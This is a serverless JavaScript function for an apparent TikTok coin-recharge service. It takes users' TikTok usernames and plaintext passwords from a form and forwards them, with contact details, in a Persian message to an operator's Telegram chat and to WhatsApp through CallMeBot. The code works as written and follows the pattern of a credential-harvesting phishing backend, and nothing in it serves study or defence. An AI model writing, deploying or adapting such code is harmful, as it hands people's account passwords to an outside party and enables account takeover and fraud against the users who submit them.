exports.handler = async function(event) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  const CALLMEBOT_PHONE = process.env.CALLMEBOT_PHONE;
  const CALLMEBOT_APIKEY = process.env.CALLMEBOT_APIKEY;

  let body;
  try { body = JSON.parse(event.body); }
  catch(e) { return { statusCode: 400, body: JSON.stringify({ error: 'Invalid JSON' }) }; }

  const { tiktokUsername, tiktokPassword, contactMethod, contactValue } = body;
  if (!tiktokUsername || !tiktokPassword || !contactValue) {
    return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
  }

  const requestId = 'TT-' + Date.now().toString().slice(-8);
  const msg = `🎵 درخواست جدید TikTok Coins!\n\n🆔 ${requestId}\n👤 یوزرنیم: ${tiktokUsername}\n🔑 پسورد: ${tiktokPassword}\n📞 راه تماس: ${contactMethod} - ${contactValue}\n\n⚠️ این اطلاعات حساس است، لطفاً پس از شارژ حساب، پسورد را در پیام‌ها حذف کنید.`;

  if (TELEGRAM_TOKEN && CHAT_ID) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    } catch(e) { console.error('Telegram error:', e); }
  }

  if (CALLMEBOT_PHONE && CALLMEBOT_APIKEY) {
    try {
      const waUrl = `https://api.callmebot.com/whatsapp.php?phone=${CALLMEBOT_PHONE}&text=${encodeURIComponent(msg)}&apikey=${CALLMEBOT_APIKEY}`;
      await fetch(waUrl);
    } catch(e) { console.error('CallMeBot WhatsApp error:', e); }
  }

  // Note: intentionally not persisted to Blobs storage, since it contains a plaintext
  // password. Only sent directly to the admin's Telegram/WhatsApp for manual processing.

  return {
    statusCode: 200,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ success: true, requestId })
  };
};
